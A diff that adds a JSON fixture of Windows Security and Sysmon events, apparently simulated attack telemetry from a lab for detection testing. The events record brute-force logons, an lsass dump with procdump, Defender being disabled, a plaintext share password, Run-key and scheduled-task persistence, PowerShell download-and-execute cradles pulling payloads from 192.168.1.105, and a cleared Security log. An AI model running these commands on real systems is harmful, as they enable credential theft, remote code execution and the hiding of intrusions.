@@ -1,0 +1,482 @@
+[
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:55:58Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
+      "SubjectUserName": "Administrator"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:30:03Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "64710"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:46:20Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -c \"Get-Process | Where-Object {$_.Name -eq 'lsass'}\"",
+      "SubjectUserName": "Administrator",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:32:58Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "51106"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:34:27Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "63226"
+    }
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2024-06-15T02:45:26Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "User": "CORP\\Administrator",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessId": "7846"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T03:01:45Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net use \\\\192.168.1.110\\C$ /user:Administrator Lab123!",
+      "SubjectUserName": "Administrator"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:42:42Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -exec bypass -c \"Import-Module C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\"",
+      "SubjectUserName": "Administrator",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2024-06-15T02:46:13Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net user",
+      "User": "CORP\\Administrator",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessId": "6857"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:30:13Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "52869"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:32:45Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "53985"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:30:49Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "64323"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:30:36Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "63503"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:32:02Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "58482"
+    }
+  },
+  {
+    "event_id": "3",
+    "timestamp": "2024-06-15T03:01:37Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "DestinationIp": "192.168.1.115",
+      "DestinationPort": "445",
+      "User": "CORP\\Administrator",
+      "Protocol": "tcp"
+    }
+  },
+  {
+    "event_id": "13",
+    "timestamp": "2024-06-15T03:06:20Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "EventType": "SetValue",
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+      "Details": "C:\\Users\\Administrator\\AppData\\Roaming\\svchost.exe",
+      "User": "CORP\\Administrator"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:32:33Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "56656"
+    }
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2024-06-15T02:42:44Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\hostname.exe",
+      "CommandLine": "hostname",
+      "User": "CORP\\Administrator",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessId": "1979"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:32:42Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "62783"
+    }
+  },
+  {
+    "event_id": "13",
+    "timestamp": "2024-06-15T02:56:28Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "EventType": "SetValue",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+      "Details": "DWORD (0x00000001)",
+      "User": "CORP\\Administrator"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:42:02Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "pwsh.exe -c \"[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')\"",
+      "SubjectUserName": "Administrator",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  {
+    "event_id": "4698",
+    "timestamp": "2024-06-15T02:53:15Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "SubjectUserName": "Administrator",
+      "TaskName": "\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck",
+      "TaskContent": "<Actions><Exec><Command>powershell.exe</Command><Arguments>-NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.105/stage2.ps1')</Arguments></Exec></Actions>"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:44:54Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
+      "SubjectUserName": "Administrator",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:30:20Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "53393"
+    }
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2024-06-15T02:45:22Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "CommandLine": "whoami /all",
+      "User": "CORP\\Administrator",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessId": "9922"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:33:08Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "60817"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:31:07Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "55566"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T03:15:53Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe",
+      "CommandLine": "wevtutil cl Security",
+      "SubjectUserName": "Administrator"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:31:09Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "60160"
+    }
+  },
+  {
+    "event_id": "10",
+    "timestamp": "2024-06-15T02:49:11Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1010",
+      "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll|C:\\Windows\\System32\\KERNELBASE.dll",
+      "User": "CORP\\Administrator"
+    }
+  },
+  {
+    "event_id": "3",
+    "timestamp": "2024-06-15T03:03:47Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "DestinationIp": "192.168.1.110",
+      "DestinationPort": "445",
+      "User": "CORP\\Administrator",
+      "Protocol": "tcp"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:49:27Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Tools\\procdump.exe",
+      "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
+      "SubjectUserName": "Administrator",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2024-06-15T02:44:40Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "data": {
+      "Image": "C:\\Windows\\System32\\systeminfo.exe",
+      "CommandLine": "systeminfo",
+      "User": "CORP\\Administrator",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessId": "5199"
+    }
+  },
+  {
+    "event_id": "4625",
+    "timestamp": "2024-06-15T02:30:11Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "FailureReason": "Unknown user name or bad password",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "IpPort": "52790"
+    }
+  },
+  {
+    "event_id": "1102",
+    "timestamp": "2024-06-15T03:15:04Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "SubjectUserName": "Administrator",
+      "SubjectDomainName": "CORP",
+      "Description": "The audit log was cleared"
+    }
+  },
+  {
+    "event_id": "4688",
+    "timestamp": "2024-06-15T02:43:19Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.105/payload.ps1')",
+      "SubjectUserName": "Administrator",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  {
+    "event_id": "4624",
+    "timestamp": "2024-06-15T02:36:44Z",
+    "computer": "WORKSTATION-01",
+    "channel": "Security",
+    "data": {
+      "TargetUserName": "Administrator",
+      "TargetDomainName": "CORP",
+      "LogonType": "3",
+      "IpAddress": "192.168.1.105",
+      "LogonProcessName": "NtLmSsp"
+    }
+  }
+]
